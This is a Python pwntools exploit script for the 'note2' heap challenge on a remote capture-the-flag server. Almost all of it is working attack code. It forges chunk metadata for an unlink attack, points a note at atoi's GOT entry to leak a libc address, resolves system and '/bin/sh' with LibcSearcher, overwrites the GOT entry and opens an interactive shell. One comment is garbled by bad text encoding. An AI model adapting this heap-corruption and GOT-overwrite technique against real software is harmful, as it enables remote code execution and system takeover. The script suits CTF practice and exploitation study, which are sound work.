from pwn import *
from LibcSearcher import *

host = 'node5.buuoj.cn'
port = 28578
sh = remote(host, port)
# sh = process('./note2')

note2 = ELF('./note2')
context.log_level = 'debug'

def newnote(length, content):
    sh.recvuntil(b'option--->>')
    sh.sendline(b'1')
    sh.recvuntil(b'(less than 128)')
    sh.sendline(str(length).encode())
    sh.recvuntil(b'content:')
    sh.sendline(content)

def shownote(id):
    sh.recvuntil(b'option--->>')
    sh.sendline(b'2')
    sh.recvuntil(b'note:')
    sh.sendline(str(id).encode())
    # Wait for the note content to be displayed
    sh.recvline()  # Skip the "content is" line or similar

def editnote(id, choice, s):
    sh.recvuntil(b'option--->>')
    sh.sendline(b'3')
    sh.recvuntil(b'note:')
    sh.sendline(str(id).encode())
    sh.recvuntil(b'2.append]')
    sh.sendline(str(choice).encode())
    sh.sendline(s)

def deletenote(id):
    sh.recvuntil(b'option--->>')
    sh.sendline(b'4')
    sh.recvuntil(b'note:')
    sh.sendline(str(id).encode())

sh.recvuntil(b'name:')
sh.sendline(b'hello')
sh.recvuntil(b'address:')
sh.sendline(b'hello')

ptr = 0x0000000000602120  
fakefd = ptr - 0x18
fakebk = ptr - 0x10
content = b'a'*8 + p64(0x61) + p64(fakefd) + p64(fakebk) + b'b'*64 + p64(0x60)

newnote(128, content)

newnote(0, b'a' * 8)

newnote(0x80, b'b' * 16)

deletenote(1)
content = b'a'*16 + p64(0xa0) + p64(0x90)
newnote(0, content)

deletenote(2)

atoi_got = note2.got['atoi']
content = b'a' * 0x18 + p64(atoi_got)
editnote(0, 1, content)

sh.recvuntil(b'option--->>')
sh.sendline(b'2')
sh.recvuntil(b'note:')
sh.sendline(b'0')

sh.recvuntil(b'is ')  
atoi_addr = u64(sh.recv(8).ljust(8, b'\x00'))
print('leak atoi addr: ' + hex(atoi_addr))

# ä½¿ç”¨LibcSearcher
libc_search = LibcSearcher('atoi', atoi_addr)
atoi_offset = libc_search.dump('atoi')
libcbase = atoi_addr - atoi_offset
print('libc base: ' + hex(libcbase))

system_offset = libc_search.dump('system')
system_addr = libcbase + system_offset
print('system addr: ', hex(system_addr))

# get /bin/sh addr
binsh_offset = libc_search.dump('str_bin_sh')
binsh_addr = libcbase + binsh_offset
print('/bin/sh addr: ', hex(binsh_addr))

# overwrite atoi_got -> system_addr
content = p64(system_addr)
editnote(0, 1, content)

# call '/bin/sh'
sh.recvuntil(b'option--->>')
# send '/bin/sh' -> system('/bin/sh')
sh.sendline(b'/bin/sh')

sh.interactive()